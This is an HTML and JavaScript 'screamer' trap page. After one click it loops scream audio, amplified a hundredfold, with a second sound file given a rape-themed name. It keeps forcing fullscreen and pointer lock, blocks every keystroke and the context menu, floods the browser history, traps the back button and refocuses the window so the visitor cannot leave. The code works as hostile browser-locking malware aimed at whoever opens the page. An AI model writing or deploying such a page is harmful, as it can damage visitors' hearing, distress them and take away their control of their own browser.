<!DOCTYPE html>
<html>
<head>
    <!-- Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-149452514-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-149452514-1');
    </script>

    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-validate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <style>
        * {
            padding: 0;
            margin: 0;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            height: 100%;
            overflow: hidden;
            background: black; /* fallback */
            cursor: none;
        }

        /* Background image – 32.png covers everything */
        body {
            background: url('32.png') no-repeat center center fixed;
            background-size: cover;
        }

        /* Initial overlay – click anywhere to start */
        #startOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0,0,0,0.6); /* semi-transparent so 32.png shows through */
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999999;
            cursor: pointer;
        }

        #startOverlay button {
            padding: 20px 40px;
            font-size: 32px;
            background: white;
            color: black;
            border: 2px solid red;
            border-radius: 0;
            cursor: pointer;
            font-family: sans-serif;
            box-shadow: 0 0 20px red;
        }

        /* Video container – centered */
        .video-container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 1280px;
            height: 480px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 1000;
            pointer-events: none; /* so clicks pass through to overlay when active */
        }

        .video-wrapper {
            width: 640px;
            height: 480px;
            position: relative;
        }

        #fart, #ronnie {
            width: 100%;
            height: 100%;
            object-fit: contain;
            position: absolute;
            top: 0;
        }

        #fart { left: 0; }
        #ronnie { right: 0; }

        .video-divider {
            width: 2px;
            height: 480px;
            background: red;
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
        }

        /* Trap div – inspired by kekma: mouseover triggers fullscreen */
        .trap {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 5000;
            pointer-events: none; /* disabled until start, then enabled */
        }

        /* Hide everything until start */
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <!-- Start overlay (click anywhere) -->
    <div id="startOverlay">
        <button>ENTER</button>
    </div>

    <!-- Audio elements (hidden) -->
    <audio id="shart" preload="auto" loop src="scream.mp3"></audio>
    <audio id="shart2" preload="auto" loop src="scream.mp3"></audio>
    <audio id="shart3" preload="auto" loop src="rape.mp3"></audio>

    <!-- Video container -->
    <div class="video-container">
        <div class="video-wrapper">
            <video id="fart" loop src="zzart.mp4" playsinline></video>
        </div>
        <div class="video-divider"></div>
        <div class="video-wrapper">
            <video id="ronnie" loop src="ronnie.mp4" playsinline></video>
        </div>
    </div>

    <!-- Trap div (invisible, but catches mouse after start) -->
    <div class="trap" id="trapDiv"></div>

    <script>
        (function() {
            let hasStarted = false;

            // References
            const overlay = document.getElementById('startOverlay');
            const trap = document.getElementById('trapDiv');
            const audioElements = [
                document.getElementById('shart'),
                document.getElementById('shart2'),
                document.getElementById('shart3')
            ];
            const videoElements = [
                document.getElementById('fart'),
                document.getElementById('ronnie')
            ];

            // --- AUDIO BOOST (extreme) ---
            let audioContext;
            let gainNode;
            const mediaElements = [];

            function initAudioBoost() {
                audioContext = new (window.AudioContext || window.webkitAudioContext)();
                gainNode = audioContext.createGain();
                gainNode.gain.value = 100; // 100x – LOUD
                gainNode.connect(audioContext.destination);

                // Connect audio elements
                audioElements.forEach(el => {
                    if (el) {
                        mediaElements.push(el);
                        try {
                            const source = audioContext.createMediaElementSource(el);
                            source.connect(gainNode);
                        } catch(e) { /* element already connected? ignore */ }
                        el.loop = true;
                        el.muted = false;
                    }
                });

                // Connect video elements (if they have audio tracks)
                videoElements.forEach(el => {
                    if (el) {
                        mediaElements.push(el);
                        try {
                            const source = audioContext.createMediaElementSource(el);
                            source.connect(gainNode);
                        } catch(e) {}
                        el.loop = true;
                        el.muted = false;
                    }
                });
            }

            function playAllMedia() {
                if (audioContext && audioContext.state === 'suspended') {
                    audioContext.resume();
                }
                mediaElements.forEach(m => {
                    if (m) {
                        m.volume = 1.0;
                        m.muted = false;
                        const playPromise = m.play();
                        if (playPromise !== undefined) {
                            playPromise.catch(() => {
                                // Retry forever
                                const interval = setInterval(() => {
                                    m.play().catch(() => {});
                                }, 100);
                            });
                        }
                    }
                });
            }

            // --- FULLSCREEN LOCK (aggressive) ---
            function attemptFullscreen() {
                const elem = document.documentElement;
                if (elem.requestFullscreen) elem.requestFullscreen();
                else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
                else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
                else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
            }

            // --- POINTER LOCK ---
            function lockPointer() {
                if (document.body.requestPointerLock) {
                    document.body.requestPointerLock();
                }
            }

            // --- HISTORY FLOOD ---
            function floodHistory() {
                for (let i = 0; i < 20; i++) {
                    history.pushState(null, null, location.href);
                }
            }

            // --- KEY BLOCKING (block all keys) ---
            function blockKeys(e) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }

            // --- RE-ENGAGE LOCKS ---
            function reengageLocks() {
                if (!hasStarted) return;
                if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
                    attemptFullscreen();
                }
                if (!document.pointerLockElement) {
                    lockPointer();
                }
            }

            // --- START FUNCTION ---
            window.startExperience = function() {
                if (hasStarted) return;
                hasStarted = true;

                // Hide overlay
                overlay.style.display = 'none';

                // Enable trap div (now it can catch mouseover)
                trap.style.pointerEvents = 'auto';

                // Flood history
                floodHistory();

                // Initialize audio (requires user gesture)
                initAudioBoost();

                // Play media
                playAllMedia();

                // Initial locks
                attemptFullscreen();
                lockPointer();

                // Ultra-aggressive re-engagement every 50ms
                setInterval(reengageLocks, 50);

                // Re-engage on any user interaction
                const events = ['mousemove', 'click', 'keydown', 'touchstart', 'mousedown'];
                events.forEach(ev => {
                    document.addEventListener(ev, reengageLocks, true);
                });

                // Fullscreen change detection
                document.addEventListener('fullscreenchange', reengageLocks);
                document.addEventListener('webkitfullscreenchange', reengageLocks);
                document.addEventListener('mozfullscreenchange', reengageLocks);
                document.addEventListener('MSFullscreenChange', reengageLocks);

                // Pointer lock change detection
                document.addEventListener('pointerlockchange', reengageLocks);
                document.addEventListener('mozpointerlockchange', reengageLocks);
                document.addEventListener('webkitpointerlockchange', reengageLocks);

                // Visibility change – when user returns to tab, re-engage
                document.addEventListener('visibilitychange', function() {
                    if (!document.hidden) {
                        reengageLocks();
                        // Also try to play media again if stalled
                        playAllMedia();
                    }
                });

                // Blur – try to refocus window
                window.addEventListener('blur', function() {
                    setTimeout(function() {
                        window.focus();
                        attemptFullscreen();
                    }, 10);
                });

                // Block all keys
                document.addEventListener('keydown', blockKeys, true);
                document.addEventListener('keyup', blockKeys, true);
                document.addEventListener('keypress', blockKeys, true);

                // Trap mouseover (like kekma) to re-enter fullscreen
                trap.addEventListener('mouseover', function() {
                    if (hasStarted) {
                        attemptFullscreen();
                        lockPointer();
                    }
                });
            };

            // Start on overlay click (anywhere)
            overlay.addEventListener('click', startExperience);

            // --- INITIAL PASSIVE BLOCKS ---
            document.addEventListener('contextmenu', e => e.preventDefault(), true);
            document.addEventListener('dragstart', e => e.preventDefault(), true);
            document.addEventListener('selectstart', e => e.preventDefault(), true);

            // --- WINDOW CLOSE CONFIRMATION ---
            window.onbeforeunload = function() {
                return "Are you absolutely sure you want to leave?";
            };

            // Override window.close (useless but safe)
            window.close = function() {};

            // --- HISTORY POPSTATE TRAP ---
            window.onpopstate = function() {
                if (hasStarted) {
                    floodHistory();
                    reengageLocks();
                }
            };

            // --- RESIZE VIDEOS (keep aspect) ---
            function resizeVideos() {
                const container = document.querySelector('.video-container');
                if (container) {
                    container.style.width = (640 * 2 + 20) + 'px';
                    container.style.height = '480px';
                }
            }
            window.addEventListener('load', () => {
                resizeVideos();
                setInterval(resizeVideos, 2000);
            });

            // Preload hint: load first frame? not needed.
        })();
    </script>
</body>
</html>
